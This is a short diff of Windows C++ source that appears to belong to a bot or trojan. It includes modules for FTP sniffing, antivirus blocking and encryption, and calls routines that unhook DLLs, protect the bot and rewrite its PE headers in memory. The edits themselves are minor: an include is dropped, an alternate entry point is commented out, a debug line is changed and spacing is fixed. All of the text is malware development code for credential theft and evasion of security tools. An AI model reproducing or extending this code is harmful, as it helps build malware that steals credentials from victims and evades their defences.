@@ -1,7 +1,5 @@
 #include <windows.h>
 
-
-
 #include "BotCore.h"
 #include "DllLoader.h"
 
@@ -15,7 +13,6 @@
 #include "Config.h"
 #include "Crypt.h"
 #include "FtpSniffer.h"
-#include "AvBlock.h"
 #include "ntdll.h"
 #include "BotEvents.h"
 #include "Task.h"
@@ -42,7 +39,7 @@ namespace MAINDBGTEMPLATES
 
 
 #pragma comment(linker, "/ENTRY:MyMain" )
-
+//#pragma comment(linker, "/ENTRY:ExplorerMain" )
 
 
 
@@ -105,7 +102,7 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 {
 	BOT::Initialize();
 	
-	MDBG("Main", "*************** LoaderRoutine ***************");
+	MDBG("Main", "*************** LoaderRoutine (PID:%d)", GetUniquePID());
 
 	UnhookDlls();
 	BOT::Protect(NULL);
@@ -255,7 +252,7 @@ int APIENTRY MyMain()
 		PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)( (PCHAR)pDos + pDos->e_lfanew);
 
 		pVirtualProtect( ImageBase, pHeaders->OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &Old );
-		m_memcpy( ImageBase, pDos,pHeaders->OptionalHeader.SizeOfHeaders );
+		m_memcpy( ImageBase, pDos, pHeaders->OptionalHeader.SizeOfHeaders );
 		pVirtualProtect( ImageBase, pHeaders->OptionalHeader.SizeOfHeaders, Old, &Old );
 	}	
 
